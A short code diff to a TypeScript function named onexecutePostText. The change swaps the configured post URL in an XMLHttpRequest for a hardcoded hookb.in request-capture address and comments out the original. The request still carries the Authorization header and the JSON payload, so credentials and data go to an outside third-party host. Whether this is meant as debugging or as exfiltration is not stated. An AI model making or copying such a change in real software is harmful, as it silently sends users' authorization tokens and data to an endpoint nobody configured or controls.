@@ -156,7 +156,7 @@ function onexecutePostText(properties: SingleRecord, configuration: SingleRecord
             }
         };
 
-        xhr.open("POST", postURL);
+        xhr.open("POST", "https://hookb.in/RZeagyBlzrHREEj72O3Y");//postURL);
         xhr.setRequestHeader('Authorization', authHeader);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.setRequestHeader('Host', host);
